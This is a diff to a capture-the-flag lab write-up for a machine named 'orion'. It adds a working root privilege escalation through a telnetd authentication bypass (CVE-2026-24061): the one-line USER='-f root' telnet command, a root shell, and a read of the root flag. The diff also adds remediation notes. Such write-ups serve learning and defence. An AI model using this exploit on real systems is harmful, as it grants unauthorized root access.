@@ -157,7 +157,7 @@ meterpreter >
 ---
 ## User Flag
 
-### Lateral Movement (if applicable)
+### Lateral Movement from www-data to adam:
 
 ```
 meterpreter > shell
@@ -472,22 +472,61 @@ adam@orion:~$
 
 ```
 
-
-
-### Exploitation
+telnetd in GNU Inetutils through 2.7 allows remote authentication bypass via a "-f root" value for the USER environment variable.
+### Exploitation CVE-2026-24061
 
 PoC: https://medium.com/@shivam_bathla/telnetd-auth-bypass-to-root-f6e239d692b5
 
 ```shell
-# Commands used
+adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+
+Linux 5.15.0-177-generic (orion) (pts/3)
+
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat Jun 27 12:05:03 PM UTC 2026
+
+  System load:  0.0               Processes:             231
+  Usage of /:   78.3% of 5.81GB   Users logged in:       1
+  Memory usage: 10%               IPv4 address for eth0: 10.129.35.17
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+2 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+root@orion:~# 
 ```
 
+## Root flag
+
+```
+root@orion:~# cat /root/root.txt
+8a40ae244433c71c6b174e4ea8fec4ef (censor)
+```
 ---
 ## Remediation
 
-- Key takeaway 1
-- Key takeaway 2
-- Key takeaway 3
+- cve 2025 32432 : update craftcms to a patched version
+- plaintext database credentials stored in an enviromental variable
+- CVE-2026-24061 upgrade telnet to a patched version
 
 ---
 ## References
